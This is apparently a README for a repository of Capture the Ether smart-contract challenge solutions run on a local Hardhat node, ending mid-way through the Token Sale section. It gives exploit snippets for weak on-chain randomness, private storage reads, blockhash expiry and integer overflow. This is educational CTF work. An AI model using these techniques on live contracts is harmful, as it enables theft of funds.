# [Capture The Ether](https://capturetheether.com/challenges/)

---

### Capture the Ether using Hardat
These challenges were originally deployed to the Ropsten testnet which is now deprecated
However, the challenges can be completed using something like the Remix IDE
Or we can use devlopment environments like Hardhat or Foundry
This repo uses Hardhat v2.17.2.
It has the contracts, deploy scripts, and tests needed to complete the challenges
Add the old compiler version to ``hardhat.config.ts``
```js
import { HardhatUserConfig } from "hardhat/config";
import "@nomicfoundation/hardhat-toolbox";

const config: HardhatUserConfig = {
  solidity: {
    compilers: [
      {
        version: "0.4.21",
      },
      {
        version: "0.8.19",
      },
    ],
  },
  mocha: {
    timeout: 1000000,
  },
};

export default config;
```

#### Local Hardhat node
The challenges were completed using a local node
```
npx hardhat node
```
tests and scripts were run with the command:
```
npx hardhat test <test file>
```
```
npx hardhat run <script file>
```

#### Warmup
##### [Deploy A Contract](https://capturetheether.com/challenges/warmup/deploy/)
Deploy the contract and call the ``isComplete()`` function
[Script](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/scripts/warmup/deployChallenge.ts)

##### [Call Me](https://capturetheether.com/challenges/warmup/call-me/)
Deploy the contract and call the ``callMe()`` function
[Script]

##### [Choose a nickname](https://capturetheether.com/challenges/warmup/nickname/)
Before setting a nickname, it needs to be encoded
```js
let name = ethers.encodeBytes32String("Robin");
```
Accessing the nickname from the mapping and comparing it the name variable should return true
[Test](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/test/warmup/captureTheEther.ts) &nbsp; [Script](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/scripts/warmup/captureTheEther.ts)


#### Lotteries
##### [Guess the Number](https://capturetheether.com/challenges/lotteries/guess-the-number/)
The number is stored as a variable so we can use it as an argument in the ``guess()`` function
```js
const tx = await contract.guess(42, {
    value: ethers.parseEther("1"),
});
```
[Test](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/test/lotteries/guessTheNumber.ts) &nbsp; [Script](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/scripts/lotteries/guessTheNumberChallenge.ts)

##### [Guess the Secret Number](https://capturetheether.com/challenges/lotteries/guess-the-secret-number/)
To solve this challenge, we use the ``uint8`` parameter of ``guess()`` as a hint. ``uint8`` is an unsigned integer with 8 bits. It can hold a maximum value of 255, so we know the answer is between 0 and 255.
We can use a forloop to find the answer
```js
const answerHash =
    "0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365";
let secretNumber;
for (let i = 0; i <= 255; i++) {
    const numberBytes = ethers.toBeHex(i);
    const hash = ethers.keccak256(numberBytes);
    if (answerHash === hash) {
    secretNumber = i;
    console.log(`The secret number is ${secretNumber}`);
    break;
    }
}
```
[Test](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/test/lotteries/guessTheSecretNumber.ts) &nbsp;
[Script](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/scripts/lotteries/guessTheSecretNumber.ts)

##### [Guess the Random Number](https://capturetheether.com/challenges/lotteries/guess-the-random-number/)
In this challenge, the constructor calculates the answer using the blocknumber and timestamp. But the answer is stored as a state variable. We can [access storage variables starting from position 0](https://docs.soliditylang.org/en/v0.6.6/miscellaneous.html#layout-of-state-variables-in-storage)
```js
const answer = await ethers.provider.getStorage(contract.target, 0);
```
[Test](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/test/lotteries/guessTheRandomNumber.ts) &nbsp; [Script](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/scripts/lotteries/guessTheRandomNumber.ts)

##### [Guess the New Number](https://capturetheether.com/challenges/lotteries/guess-the-new-number/)
To solve this challenge, a second contract can be created that interfaces with the first contract
```js
interface IGuessTheNewNumberChallenge {
    function guess(uint8) external payable;

    function isComplete() external view returns (bool);
}
```
The newer compiler versions don't have the ability to directly convert from ``bytes32`` to ``uint8`` like this
```js
function guess(uint8 n) public payable {
    require(msg.value == 1 ether);
    uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

    if (n == answer) {
        msg.sender.transfer(2 ether);
    }
}
```
The second contract will contain a function that replicates the original ``guess`` function requiring a few extra steps to get to a ``uint8``
```js
function solve() external payable {
    require(address(this).balance >= 1 ether, "");

    bytes32 hash = keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp));
    uint256 number = uint256(hash);
    uint8 answer = uint8(number);

    challengeContract.guess{value:1 ether}(answer);

    require(challengeContract.isComplete(), "");

    payable(msg.sender).transfer(address(this).balance);
}
```
This allows the second contract to create a "random" number using the same blocknumber and timestamp that will be used in the original contract when the second contract makes a call to the first
[Test](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/test/lotteries/guessTheSecretNumber.ts) &nbsp; [Script](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/scripts/lotteries/guessTheSecretNumber.ts)

##### [Predict the Future](https://capturetheether.com/challenges/lotteries/predict-the-future/)
As with the last challenge, this challenge will use a second contract that interfaces with the first contract. However, in this challenge, a guess has to be locked in before the contract logic creates a "random" number. The guess will be between 0 and 9
```js
bytes32 hash = keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp));
uint256 number = uint256(hash);
uint8 answer = uint8(number % 10);
```
The second contract will call the ``lockInguess`` function from the first contract with ``0`` as the guess. The logic from the second contract will require that the answer is ``0`` before the ``settle`` function from the first contract is called
```js
function solve() external payable {
    bytes32 hash = keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp));
    uint256 number = uint256(hash);
    uint8 answer = uint8(number % 10);

    require(answer == 0);

    challengeContract.settle();
    payable(msg.sender).transfer(address(this).balance);
}
```
Only one ether will be used. A while loop can be used to keep calling the ``solve`` function from the second contract until the answer is ``0``
```js
while (!(await contract.isComplete())) {
    try {
    const solve = await contract2.solve({ gasLimit: 1000000 });
    await solve.wait();
    } catch (err) {
    console.log(`attack failed`);
    }
    const blockNumber = await ethers.provider.getBlockNumber();
    console.log(`block number: ${blockNumber}`);
}
```
[Test](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/test/lotteries/predictTheFuture.ts) &nbsp; [Script](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/scripts/lotteries/predeictTheFutureChallenge.ts)

##### [Predict the Blockhash](https://capturetheether.com/challenges/lotteries/predict-the-block-hash/)
This challenge uses the blocknumber to create a hash that is used as a comparison to the hash that is guessed. [blocknumber](https://docs.soliditylang.org/en/v0.8.21/units-and-global-variables.html#block-and-transaction-properties) only includes the 256 most recent blocks. Anything outside of this range returns 0.
We can use a forloop to mine blocks after we input our guess of "0x0000000000000000000000000000000000000000000000000000000000000000"
```js
for (let i = 0; i < 257; i++) {
      await ethers.provider.send("evm_mine");
      console.log("block mined");
    }
```
At this point, the ``settle`` function is called, but the block for our guess is from 256 blocks ago. This ensures that the hash is going to match our guess.
[Test](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/test/lotteries/predictTheBlockHash.ts) &nsbp; [Script](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/scripts/lotteries/predictTheBlockHashChallenge.ts)

#### Math
##### [Token Sale](https://capturetheether.com/challenges/math/token-sale/)
The goal of this challenge is to extract ether so the remaining balance is less than one. When the contract is deployed, it will be deployed with 1 ether. This challenge involves taking advantage of the fact that older compiler versions don't check for overflow/underflow. We can cause an overflow taking advantage of
```js
uint256 constant PRICE_PER_TOKEN = 1 ether;
...
require(msg.value == numTokens * PRICE_PER_TOKEN);
```
We can cause on overflow with the following logic, buying a large amount of tokens with less that one ETH and selling a token for one ETH
```js
const numNumerator = BigInt(2) ** BigInt(256);
const numDenominator = BigInt(10) ** BigInt(18);
const numResult = numNumerator / numDenominator + BigInt(1); // 115792089237316195423570985008687907853269984665640564039458

const ethNumerator = BigInt(2) ** BigInt(256);
const ethDenominator = BigInt(10) ** BigInt(18);
const ethResult =
    (ethNumerator / ethDenominator + BigInt(1)) * ethDenominator -
    ethNumerator; // 415992086870360064
```